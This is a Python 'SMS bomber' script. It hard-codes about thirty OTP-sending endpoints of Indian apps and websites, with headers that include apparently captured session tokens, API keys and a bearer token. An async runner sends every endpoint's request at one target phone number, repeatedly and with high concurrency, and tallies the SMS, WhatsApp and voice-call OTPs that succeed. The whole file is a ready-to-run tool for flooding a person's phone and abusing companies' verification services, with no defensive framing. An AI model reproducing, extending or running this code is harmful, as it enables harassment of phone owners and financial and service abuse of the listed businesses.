import asyncio
import aiohttp
import time

try:
    import uvloop
    uvloop.install()
except ImportError:
    pass

API_CONFIGS = [
    {
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Country-Code": "IN",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
            "Origin": "https://www.lenskart.com",
        },
        "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Shemaroo",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.shemaroome.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f"mobile_no=%2B91{p}",
        "type": "SMS",
    },
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.nobroker.in",
        },
        "data": lambda p: f"phone={p}&countryCode=IN",
        "type": "SMS",
    },
    {
        "name": "Wakefit",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "API-Secret-Key": "ycq55IbIjkLb",
            "API-Token": "c84d563b77441d784dce71323f69eb42",
            "Origin": "https://www.wakefit.co",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}',
        "type": "SMS",
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=UTF-8",
            "client": "app",
            "User-Agent": "Dart/3.6 (dart:io)",
        },
        "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}',
        "type": "SMS",
    },
    {
        "name": "Stratzy SMS",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Stratzy WA",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}',
        "type": "WA",
    },
    {
        "name": "Foxy WA",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}',
        "type": "WA",
    },
    {
        "name": "EkaCare WA",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Device-Id": "5df83c463f0ff8ff",
            "Flavour": "android",
            "Version": "1382",
            "Client-Id": "androidp",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.3",
        },
        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}',
        "type": "WA",
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://smytten.com",
            "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone":"{p}","email":"test@gmail.com","device_platform":"web"}}',
        "type": "SMS",
    },
    {
        "name": "Servetel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)",
        },
        "data": lambda p: f"mobile_number={p}",
        "type": "SMS",
    },
    {
        "name": "MeruCabs",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0",
        },
        "data": lambda p: f"mobile_number={p}",
        "type": "SMS",
    },
    {
        "name": "GokWik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6jlc658iad",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc0NTIzOTI0MywiZXhwIjoxNzQ1MjM5MzAzfQ.-gV0sRUkGD4SPGPUUJ6XBanoDCI7VSNX99oGsUU5nWk",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone":"{p}","country":"in"}}',
        "type": "SMS",
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Rappi WA",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2)",
        },
        "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}',
        "type": "WA",
    },
    {
        "name": "KPNFresh WA",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/5.0.0-alpha.11",
        },
        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}',
        "type": "WA",
    },
    {
        "name": "Hungama",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "country_code": "IN",
            "Origin": "https://www.hungama.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","device":"web","variant":"v1","templateCode":1}}',
        "type": "SMS",
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1",
        },
        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Caller": "web_app",
            "Origin": "https://newme.asia",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/131.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}',
        "type": "SMS",
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "Origin": "https://www.snitch.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"mobile_number":"+91{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Univest",
        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
        "method": "GET",
        "headers": {"User-Agent": "okhttp/3.9.1"},
        "data": None,
        "type": "SMS",
    },
    {
        "name": "Jockey SMS",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
            "Referer": "https://www.jockey.in/",
        },
        "data": None,
        "type": "SMS",
    },
    {
        "name": "Jockey WA",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
            "Referer": "https://www.jockey.in/",
        },
        "data": None,
        "type": "WA",
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://wellacademy.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"contact_no":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Beepkart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "appname": "Website",
            "Origin": "https://www.beepkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"phone":"{p}","city":362,"source":"myaccount","consent":false}}',
        "type": "SMS",
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/120.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f'{{"query":"mutation {{ SendOtp(input: {{mobile:\\"{p}\\",isdCode:\\"91\\",otpType:\\"registerOtp\\"}}) {{ status {{ message code }} }} }}"}}',
        "type": "SMS",
    },
    {
        "name": "LendingPlate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://lendingplate.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) Chrome/135.0.0.0 Mobile Safari/537.36",
        },
        "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3",
        "type": "SMS",
    },
    {
        "name": "GoPinkCabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.gopinkcabs.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Mobile Safari/537.36",
        },
        "data": lambda p: f"check_mobile_number=1&contact={p}",
        "type": "SMS",
    },
    {
        "name": "MSG91 CALL",
        "url": "https://control.msg91.com/api/v5/widget/callWidget",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authkey": "YOUR_MSG91_AUTHKEY",
            "User-Agent": "Mozilla/5.0",
        },
        "data": lambda p: f'{{"mobile":"91{p}","template_id":"YOUR_MSG91_TEMPLATE_ID"}}',
        "type": "CALL",
    },
    {
        "name": "Fast2SMS CALL",
        "url": "https://www.fast2sms.com/dev/voice",
        "method": "POST",
        "headers": {
            "authorization": "YOUR_FAST2SMS_API_KEY",
            "Content-Type": "application/json",
        },
        "data": lambda p: f'{{"variables_values":"1234","route":"v3","numbers":"{p}"}}',
        "type": "CALL",
    },
    {
        "name": "Twilio CALL",
        "url": "https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Calls.json",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic YOUR_BASE64_CREDENTIALS",
        },
        "data": lambda p: f"To=%2B91{p}&From=%2B1YOUR_TWILIO_NUMBER&Twiml=%3CResponse%3E%3CSay%3EYour+OTP+is+1+2+3+4+5+6%3C%2FSay%3E%3C%2FResponse%3E",
        "type": "CALL",
    },
    {
        "name": "Exotel CALL",
        "url": "https://api.exotel.com/v1/Accounts/YOUR_SID/Calls.json",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic YOUR_EXOTEL_BASE64",
        },
        "data": lambda p: f"From=YOUR_EXOTEL_NUMBER&To=0{p}&CallerId=YOUR_CALLER_ID&Url=http://my.exotel.com/YOUR_SID/exoml/start_voice/YOUR_APP_ID",
        "type": "CALL",
    },
]


async def _call(session, cfg, phone):
    try:
        url = cfg["url"](phone) if callable(cfg["url"]) else cfg["url"]
        data = cfg["data"](phone) if cfg["data"] else None
        h = {k: (v(data) if callable(v) else v) for k, v in cfg["headers"].items()}
        to = aiohttp.ClientTimeout(total=1.5, connect=0.8, sock_read=0.8)
        if cfg["method"] == "GET":
            async with session.get(url, headers=h, timeout=to) as r:
                return cfg["type"], r.status, (await r.text())[:200]
        else:
            async with session.post(url, headers=h, data=data, timeout=to) as r:
                return cfg["type"], r.status, (await r.text())[:200]
    except Exception as e:
        return cfg["type"], None, str(e)[:80]


async def run_bomber(phone: str, mode: str = "ALL", rounds: int = 1) -> dict:
    pool = (
        API_CONFIGS if mode == "ALL"
        else [c for c in API_CONFIGS if c["type"] == mode]
    )
    connector = aiohttp.TCPConnector(
        limit=600, limit_per_host=200,
        ttl_dns_cache=300, force_close=False,
        enable_cleanup_closed=True,
    )
    sms_ok = wa_ok = call_ok = total = 0
    kw = ["success", "sent", "otp", "ok", "true", "1"]
    start = time.time()
    async with aiohttp.ClientSession(connector=connector) as session:
        for _ in range(rounds):
            results = await asyncio.gather(
                *[_call(session, cfg, phone) for cfg in pool],
                return_exceptions=True,
            )
            for res in results:
                if isinstance(res, Exception):
                    continue
                typ, status, text = res
                total += 1
                if status and status < 400 and any(k in text.lower() for k in kw):
                    if typ == "SMS":    sms_ok += 1
                    elif typ == "WA":   wa_ok += 1
                    elif typ == "CALL": call_ok += 1
    elapsed = time.time() - start
    return {
        "sms": sms_ok,
        "wa": wa_ok,
        "call": call_ok,
        "total": total,
        "rps": round(total / elapsed, 2) if elapsed else 0,
    }
